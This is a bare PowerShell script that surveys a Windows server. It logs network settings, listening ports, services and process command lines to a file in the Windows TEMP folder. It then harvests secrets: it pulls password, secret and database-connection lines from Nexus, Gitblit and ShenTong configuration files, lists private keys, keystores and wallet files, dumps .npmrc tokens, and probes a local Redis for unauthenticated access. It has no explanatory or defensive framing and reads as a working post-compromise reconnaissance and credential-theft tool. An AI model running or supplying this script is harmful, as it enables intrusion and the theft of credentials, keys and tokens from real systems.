$T="C:\Windows\TEMP"; $R="$T\h4assets.txt"
del $R 2>$null
function W($s){ Add-Content -Path $R -Value $s }
W ("TIME " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss"))
W "=== NET ==="
ipconfig /all 2>$null | Select-String "IPv4|Default Gateway|Subnet Prefix|DNS Servers" | ForEach-Object { W ("  " + $_.Line.Trim()) }
W "=== LISTENING ==="
netstat -ano 2>$null | Select-String "LISTENING" | ForEach-Object { W ("  " + $_.Line.Trim()) }
W "=== RUNNING_SERVICES ==="
Get-Service 2>$null | Where-Object { $_.Status -eq "Running" } | ForEach-Object { W ("  " + $_.Name + " :: " + $_.DisplayName) }
W "=== SVC_BAK ==="
$sb = Get-Service svc_bak -EA SilentlyContinue
if ($sb) { W ("  svc_bak=" + $sb.Status) } else { W "  svc_bak=NONE" }
W "=== PROC_CMDS ==="
Get-CimInstance Win32_Process -Filter "Name='java.exe' OR Name='redis-server.exe' OR Name='redis-service.exe' OR Name='mysqld.exe'" -EA SilentlyContinue | ForEach-Object { W ("  " + $_.Name + " :: " + $_.CommandLine) }
W "=== NEXUS ==="
Get-ChildItem "D:\nexus" -Recurse -Depth 3 -Filter "nexus.properties" -EA SilentlyContinue | ForEach-Object { W ("  FILE: " + $_.FullName); Get-Content $_.FullName -EA SilentlyContinue | Where-Object { $_ -match "password|admin|user|port" } | ForEach-Object { W ("    " + $_) } }
W "=== MINIO ==="
Get-ChildItem "D:\minio" -Recurse -Depth 2 -Include "config.json","*.env","*.conf","*.bat","*.cmd" -EA SilentlyContinue | ForEach-Object { W ("  FILE: " + $_.FullName) }
Get-ChildItem "C:\ProgramData\MinIO" -Recurse -Depth 2 -EA SilentlyContinue | ForEach-Object { W ("  PD: " + $_.FullName) }
W "=== GITBLIT ==="
Get-ChildItem "D:\gitblit-1.8.0" -Recurse -Depth 2 -Filter "gitblit.properties" -EA SilentlyContinue | ForEach-Object { W ("  FILE: " + $_.FullName); Get-Content $_.FullName -EA SilentlyContinue | Where-Object { $_ -match "user|password|host|port|account" } | ForEach-Object { W ("    " + $_) } }
W "=== WEBAPPS ==="
Get-ChildItem "D:\webapps" -Depth 1 -EA SilentlyContinue | ForEach-Object { W ("  " + $_.FullName) }
W "=== SHENTONG ==="
Get-ChildItem "D:\ShenTong" -Depth 2 -EA SilentlyContinue | Select-Object -First 50 | ForEach-Object { W ("  " + $_.FullName) }
Get-ChildItem "D:\ShenTong" -Recurse -Depth 3 -Include "application*.yml","application*.properties","*.env","*.json","*.xml" -EA SilentlyContinue | Select-Object -First 20 | ForEach-Object { W ("  CRED: " + $_.FullName); Get-Content $_.FullName -EA SilentlyContinue | Where-Object { $_ -match "password|passwd|secret|jdbc|redis|mongo|key" } | Select-Object -First 15 | ForEach-Object { W ("    " + $_) } }
W "=== KEYS_GLOBAL ==="
Get-ChildItem "C:\Users" -Recurse -Depth 3 -Include "*.pem","*.key","id_rsa","wallet*.json","*.p12","*.jks","settings.xml" -EA SilentlyContinue | Select-Object -First 30 | ForEach-Object { W ("  " + $_.FullName) }
Get-ChildItem "D:\" -Recurse -Depth 2 -Include "*.pem","*.jks","wallet*.json","*.p12","*.key" -EA SilentlyContinue | Select-Object -First 30 | ForEach-Object { W ("  " + $_.FullName) }
Get-ChildItem "C:\Users" -Recurse -Depth 3 -Filter ".npmrc" -EA SilentlyContinue | ForEach-Object { W ("  " + $_.FullName + ": " + ((Get-Content $_.FullName -EA SilentlyContinue) -join " |")) }
W "=== REDIS_PROBE ==="
try { $nc=New-Object System.Net.Sockets.TcpClient; $nc.Connect("127.0.0.1",6379); $st=$nc.GetStream(); $cmd=[System.Text.Encoding]::ASCII.GetBytes("PING" + [char]13 + [char]10); $st.Write($cmd,0,$cmd.Length); Start-Sleep 1; $buf=New-Object byte[] 4096; $n=$st.Read($buf,0,$buf.Length); W ("  PING=> " + [System.Text.Encoding]::ASCII.GetString($buf,0,$n)) } catch { W ("  REDIS_ERR: " + $_.Exception.Message) }
W "=== DONE ==="
exit 0